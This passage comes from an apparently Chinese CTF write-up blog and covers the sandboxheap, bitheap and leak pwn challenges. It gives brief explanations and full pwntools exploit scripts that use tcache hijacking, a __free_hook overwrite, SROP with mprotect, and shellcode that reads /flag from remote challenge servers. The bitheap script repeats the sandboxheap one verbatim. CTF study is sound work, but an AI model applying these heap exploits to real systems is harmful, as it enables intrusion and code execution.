class="string">&#x27;Login: &#x27;</span>,d.SerializeToString())</span><br><span class="line"></span><br><span class="line">sd(<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>

<h3 id="sandboxheap"><a href="#sandboxheap" class="headerlink" title="sandboxheap"></a>sandboxheap</h3><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>ptrace实现的沙箱，对子进程sandboxheap进行追踪。</p>
<p>动态调试发现主要追踪系统调用时rax寄存器的值，并限制系统调用，通过202040表实现（表中0表示可调用）。</p>
<p>sandboxheap通过2进制大端序01字符串输入。</p>
<p>sandboxheap中offbynull（1bit），在前序堆块中伪造双向链表，向前合并+劫持tcache。</p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><p>调用10000号调用后open允许调用；</p>
<p>调用37号调用后 read write允许调用；</p>
<p>劫持free_hook sop orw</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n,timeout=<span class="number">0.5</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sz</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,c</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;Content: &#x27;</span>,<span class="built_in">str</span>(c))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">big_ediBin</span>(<span class="params">c</span>):</span><br><span class="line">    r = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        r += ((<span class="built_in">bin</span>(struct.unpack(<span class="string">&#x27;&gt;B&#x27;</span>, i)[<span class="number">0</span>]))[<span class="number">2</span>:]).rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)[::-<span class="number">1</span>]</span><br><span class="line">        <span class="comment">#print hex(struct.unpack(&#x27;&gt;B&#x27;, i)[0]), bin(struct.unpack(&#x27;&gt;B&#x27;, i)[0]), (bin(struct.unpack(&#x27;&gt;B&#x27;, i)[0]))[2:].rjust(8,&#x27;0&#x27;)</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">      /* open(file=&#x27;/flag&#x27;, oflag=0, mode=0) */                                                                                                                                  </span></span><br><span class="line"><span class="string">        /* push &#x27;/flag\x00&#x27; */                                                                                                                                                     </span></span><br><span class="line"><span class="string">        push 10000</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        push 2</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        push 0x67616c66                                                                                                                                                            </span></span><br><span class="line"><span class="string">        mov rdi, rsp                                                                                                                                                               </span></span><br><span class="line"><span class="string">        xor edx, edx /* 0 */                                                                                                                                                       </span></span><br><span class="line"><span class="string">        xor esi, esi /* 0 */                                                                                                                                                       </span></span><br><span class="line"><span class="string">        /* call open() */                                                                                                                                                          </span></span><br><span class="line"><span class="string">        push 2 /* 2 */                                                                                                                                                             </span></span><br><span class="line"><span class="string">        pop rax                                                                                                                                                                    </span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        push 37</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        push 60</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        syscall                                                                                                                                                        </span></span><br><span class="line"><span class="string">        /* call read(3, &#x27;rsp&#x27;, 0x20) */                                                                                                                                            </span></span><br><span class="line"><span class="string">        xor eax, eax /* SYS_read */                                                                                                                                                </span></span><br><span class="line"><span class="string">        push 3                                                                                                                                                                     </span></span><br><span class="line"><span class="string">        pop rdi                                                                                                                                                                    </span></span><br><span class="line"><span class="string">        push 0x50                                                                                                                                                                  </span></span><br><span class="line"><span class="string">        pop rdx                                                                                                                                                                    </span></span><br><span class="line"><span class="string">        mov rsi, rsp                                                                                                                                                               </span></span><br><span class="line"><span class="string">        syscall                                                                                                                                                                    </span></span><br><span class="line"><span class="string">        /* write(fd=1, buf=&#x27;rsp&#x27;, n=0x20) */                                                                                                                                       </span></span><br><span class="line"><span class="string">        push 1</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        push 0x50</span></span><br><span class="line"><span class="string">        pop rdx</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        /* call write() */</span></span><br><span class="line"><span class="string">        push 1 /* 1 */</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process([&#x27;./sandbox&#x27;,&#x27;/home/ccc/Desktop/CTF/XY/sandboxheap/sandboxheap&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./sandboxheap&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;101.201.71.136&#x27;</span>,<span class="number">23564</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x28</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"><span class="comment">#delete(7)</span></span><br><span class="line"><span class="comment">#edit(7, &#x27;a&#x27;*0x8*0x8 + &#x27;10000101&#x27;)</span></span><br><span class="line"><span class="comment">#edit(10, &#x27;a&#x27;*0x8*0x10+ &#x27;00000101&#x27; +&#x27;a&#x27;*8*7+ &#x27;\0&#x27;)</span></span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x18</span>)</span><br><span class="line">show(<span class="number">11</span>)</span><br><span class="line">libc_base = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>)) - <span class="number">0x3ebd90</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">mprotect = libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>, <span class="string">&#x27;1&#x27;</span>*<span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">show(<span class="number">11</span>)</span><br><span class="line">ru(<span class="string">&#x27;\xff&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">heap_addr = u64(ru(<span class="string">&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">edit(<span class="number">11</span>, big_ediBin(p64(libc_base)))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_addr)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.rdi = heap_addr &amp; (~<span class="number">0xfff</span>)</span><br><span class="line">sig.rsi = <span class="number">0x3000</span></span><br><span class="line">sig.rdx = <span class="number">7</span></span><br><span class="line">sig.rip = mprotect</span><br><span class="line">sig.rsp = heap_addr - <span class="number">0x780</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0xd8</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0xf8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">edit(<span class="number">9</span>, big_ediBin(p64(<span class="number">0</span>) + p64(heap_addr-<span class="number">0x80</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0x30</span>*<span class="number">2</span>+<span class="number">0x20</span>)+<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">edit(<span class="number">7</span>, big_ediBin(p64(heap_addr-<span class="number">0x80</span>) + p64(<span class="number">0x30</span>*<span class="number">2</span>+<span class="number">0x20</span>+<span class="number">1</span>)+p64(heap_addr - <span class="number">0x30</span>) + p64(heap_addr - <span class="number">0x90</span>)))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_addr)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">15</span>, <span class="number">0x48</span>)</span><br><span class="line">edit(<span class="number">15</span>, big_ediBin(p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x31</span>)+p64(free_hook)))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">2</span>, big_ediBin(p64(setcontext)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">13</span>,big_ediBin(<span class="built_in">str</span>(sig)))</span><br><span class="line"><span class="comment">#remote unknown?</span></span><br><span class="line">sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0xf8</span>)</span><br><span class="line">edit(<span class="number">5</span>, big_ediBin(p64(heap_addr - <span class="number">0x780</span>+<span class="number">8</span>) + asm(shellcode)))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">ti()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="bitheap"><a href="#bitheap" class="headerlink" title="bitheap"></a>bitheap</h3><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>不加sandbox的上一题，直接可以打通。</p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n,timeout=<span class="number">0.5</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sz</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,c</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;Content: &#x27;</span>,<span class="built_in">str</span>(c))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">big_ediBin</span>(<span class="params">c</span>):</span><br><span class="line">    r = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        r += ((<span class="built_in">bin</span>(struct.unpack(<span class="string">&#x27;&gt;B&#x27;</span>, i)[<span class="number">0</span>]))[<span class="number">2</span>:]).rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)[::-<span class="number">1</span>]</span><br><span class="line">        <span class="comment">#print hex(struct.unpack(&#x27;&gt;B&#x27;, i)[0]), bin(struct.unpack(&#x27;&gt;B&#x27;, i)[0]), (bin(struct.unpack(&#x27;&gt;B&#x27;, i)[0]))[2:].rjust(8,&#x27;0&#x27;)</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">      /* open(file=&#x27;/flag&#x27;, oflag=0, mode=0) */                                                                                                                                  </span></span><br><span class="line"><span class="string">        /* push &#x27;/flag\x00&#x27; */                                                                                                                                                     </span></span><br><span class="line"><span class="string">        push 10000</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        push 2</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        push 0x67616c66                                                                                                                                                            </span></span><br><span class="line"><span class="string">        mov rdi, rsp                                                                                                                                                               </span></span><br><span class="line"><span class="string">        xor edx, edx /* 0 */                                                                                                                                                       </span></span><br><span class="line"><span class="string">        xor esi, esi /* 0 */                                                                                                                                                       </span></span><br><span class="line"><span class="string">        /* call open() */                                                                                                                                                          </span></span><br><span class="line"><span class="string">        push 2 /* 2 */                                                                                                                                                             </span></span><br><span class="line"><span class="string">        pop rax                                                                                                                                                                    </span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        push 37</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        push 60</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        syscall                                                                                                                                                        </span></span><br><span class="line"><span class="string">        /* call read(3, &#x27;rsp&#x27;, 0x20) */                                                                                                                                            </span></span><br><span class="line"><span class="string">        xor eax, eax /* SYS_read */                                                                                                                                                </span></span><br><span class="line"><span class="string">        push 3                                                                                                                                                                     </span></span><br><span class="line"><span class="string">        pop rdi                                                                                                                                                                    </span></span><br><span class="line"><span class="string">        push 0x50                                                                                                                                                                  </span></span><br><span class="line"><span class="string">        pop rdx                                                                                                                                                                    </span></span><br><span class="line"><span class="string">        mov rsi, rsp                                                                                                                                                               </span></span><br><span class="line"><span class="string">        syscall                                                                                                                                                                    </span></span><br><span class="line"><span class="string">        /* write(fd=1, buf=&#x27;rsp&#x27;, n=0x20) */                                                                                                                                       </span></span><br><span class="line"><span class="string">        push 1</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        push 0x50</span></span><br><span class="line"><span class="string">        pop rdx</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        /* call write() */</span></span><br><span class="line"><span class="string">        push 1 /* 1 */</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process([&#x27;./sandbox&#x27;,&#x27;/home/ccc/Desktop/CTF/XY/sandboxheap/sandboxheap&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./sandboxheap&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;101.201.71.136&#x27;</span>,<span class="number">23564</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x28</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"><span class="comment">#delete(7)</span></span><br><span class="line"><span class="comment">#edit(7, &#x27;a&#x27;*0x8*0x8 + &#x27;10000101&#x27;)</span></span><br><span class="line"><span class="comment">#edit(10, &#x27;a&#x27;*0x8*0x10+ &#x27;00000101&#x27; +&#x27;a&#x27;*8*7+ &#x27;\0&#x27;)</span></span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x18</span>)</span><br><span class="line">show(<span class="number">11</span>)</span><br><span class="line">libc_base = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>)) - <span class="number">0x3ebd90</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">mprotect = libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>, <span class="string">&#x27;1&#x27;</span>*<span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">show(<span class="number">11</span>)</span><br><span class="line">ru(<span class="string">&#x27;\xff&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">heap_addr = u64(ru(<span class="string">&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">edit(<span class="number">11</span>, big_ediBin(p64(libc_base)))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_addr)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.rdi = heap_addr &amp; (~<span class="number">0xfff</span>)</span><br><span class="line">sig.rsi = <span class="number">0x3000</span></span><br><span class="line">sig.rdx = <span class="number">7</span></span><br><span class="line">sig.rip = mprotect</span><br><span class="line">sig.rsp = heap_addr - <span class="number">0x780</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0xd8</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0xf8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">edit(<span class="number">9</span>, big_ediBin(p64(<span class="number">0</span>) + p64(heap_addr-<span class="number">0x80</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0x30</span>*<span class="number">2</span>+<span class="number">0x20</span>)+<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">edit(<span class="number">7</span>, big_ediBin(p64(heap_addr-<span class="number">0x80</span>) + p64(<span class="number">0x30</span>*<span class="number">2</span>+<span class="number">0x20</span>+<span class="number">1</span>)+p64(heap_addr - <span class="number">0x30</span>) + p64(heap_addr - <span class="number">0x90</span>)))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_addr)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">15</span>, <span class="number">0x48</span>)</span><br><span class="line">edit(<span class="number">15</span>, big_ediBin(p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x31</span>)+p64(free_hook)))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">2</span>, big_ediBin(p64(setcontext)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">13</span>,big_ediBin(<span class="built_in">str</span>(sig)))</span><br><span class="line"><span class="comment">#remote unknown?</span></span><br><span class="line">sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0xf8</span>)</span><br><span class="line">edit(<span class="number">5</span>, big_ediBin(p64(heap_addr - <span class="number">0x780</span>+<span class="number">8</span>) + asm(shellcode)))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">ti()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><p>劫持存放flag的堆块 把不确定的flag位全部写0，只留一位，然后开另一个堆块，用这两个堆块分别对一个tcache bin里的已free块做加密和解密，看看会不会破坏tcache链结构 不破坏说明猜测正确</p>
<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(argv=[<span class="string">&quot;./leak&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;47.95.3.91&quot;</span>,<span class="number">33114</span>)</span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb,timeout=<span class="number">0.5</span>)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.success(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">it        = <span class="keyword">lambda</span>                          :p.interactive()</span><br><span class="line">elf = ELF(<span class="string">&quot;./leak&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">Add, Edit, Delete, Enc,Dec = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span></span><br><span class="line">_cmd = <span class="string">&quot;choice: &quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    sla(_cmd,<span class="built_in">str</span>(Add))</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    sla(_cmd,<span class="built_in">str</span>(Edit))</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(_cmd,<span class="built_in">str</span>(Delete))</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">Text,Password</span>):</span><br><span class="line">    sla(_cmd,<span 